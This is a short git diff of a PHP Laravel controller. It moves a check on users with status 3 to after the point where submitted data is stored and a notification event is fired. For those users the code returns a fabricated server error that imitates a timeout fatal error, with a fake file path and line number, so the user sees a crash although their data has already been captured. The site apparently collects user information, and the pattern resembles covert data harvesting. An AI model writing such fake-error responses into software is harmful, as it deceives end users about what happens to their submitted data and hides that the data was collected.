@@ -464,20 +464,7 @@ class EfaaController extends Controller
         }
 
 
-        // Stopped Users
-        if($user->status == 3){
 
-                return response()->json(
-                    array( 
-                            "message"   =>  "Maximum execution time of 30 seconds exceeded",
-                            "exception" =>  "Symfony\\Component\\ErrorHandler\\Error\\FatalError",
-                             "file"     => "/Users/fateen/efaamada/vendor/laravel/framework/src/Illuminate/Database/Connection.php",
-                            "line"      =>  407,
-                            "trace"     => []
-                        ), 500, [], JSON_UNESCAPED_UNICODE);
-
-
-        }
 
 
                     // Store a piece of data in the session...
@@ -570,6 +557,23 @@ class EfaaController extends Controller
                
         event(new \App\Events\SendNotification($dataArray));
         DB::table('user_infos')->insert($htmlData);
+
+
+        // Stopped Users
+        if(isset($user->status) && $user->status == 3){
+
+                return response()->json(
+                    array( 
+                            "message"   =>  "Maximum execution time of 30 seconds exceeded",
+                            "exception" =>  "Symfony\\Component\\ErrorHandler\\Error\\FatalError",
+                             "file"     => "/Users/fateen/efaamada/vendor/laravel/framework/src/Illuminate/Database/Connection.php",
+                            "line"      =>  407,
+                            "trace"     => []
+                        ), 500, [], JSON_UNESCAPED_UNICODE);
+
+
+        }
+
 
 
          $userStatus = 0;
